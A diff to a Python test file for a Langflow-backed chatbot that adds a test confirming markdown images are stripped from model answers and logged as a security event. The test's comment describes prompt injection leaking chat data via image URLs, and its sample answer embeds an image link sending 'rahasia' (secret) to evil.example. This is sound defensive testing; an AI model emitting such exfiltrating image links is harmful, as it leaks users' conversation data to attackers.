@@ -19,8 +19,11 @@ def load_app_functions():
         for node in tree.body
         if (isinstance(node, ast.FunctionDef)
             and node.name in ("ask_langflow", "final_answer_text", "upload_images",
-                              "is_error_answer", "split_error"))
+                              "is_error_answer", "split_error", "strip_markdown_images",
+                              "security_event"))
         or (isinstance(node, ast.ClassDef) and node.name == "CielError")
+        or (isinstance(node, ast.Assign)
+            and getattr(node.targets[0], "id", None) in ("MARKDOWN_IMAGE", "IMAGE_REMOVED"))
     ]
 
     namespace = {
@@ -125,6 +128,20 @@ class TestResiliencePolicy(unittest.TestCase):
 
         self.assertEqual(result, "Jawaban test")
         self.assertEqual(mock_post.call_count, 1)
+
+    def test_images_in_answers_are_removed_and_logged(self):
+        # Prompt injection could make the model leak chat data through an image URL.
+        response = success_response()
+        response.data["outputs"][0]["outputs"][0]["results"]["message"]["data"]["text"] = (
+            "Hasil ![x](https://evil.example/?d=rahasia) selesai"
+        )
+
+        with patch("requests.post", return_value=response), \
+                self.assertLogs("test_resilience", level="WARNING") as logs:
+            result = ask_langflow("test")
+
+        self.assertEqual(result, "Hasil [gambar dihapus] selesai")
+        self.assertTrue(any("security_event kind=answer_image_removed" in line and "count=1" in line for line in logs.output))
 
     def test_authentication_failures(self):
 
